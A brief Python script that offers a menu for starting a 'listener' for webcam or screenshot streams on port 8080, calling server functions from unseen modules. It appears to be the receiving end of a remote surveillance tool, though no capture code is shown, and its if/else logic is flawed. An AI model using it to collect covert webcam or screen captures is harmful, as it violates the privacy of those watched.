from bruh2 import start_server
from bruh1 import start_streaming_server


def Main():
    choice = input("""
listener for what?
      
(1)webcam
(2)screenshot
                   
choice:
                   
""")
    
    if choice == "1":
       start_streaming_server(server_ip='0.0.0.0', server_port=8080)
    if choice == "2":
       start_server('0.0.0.0', 8080)
    else:
        Main()

Main()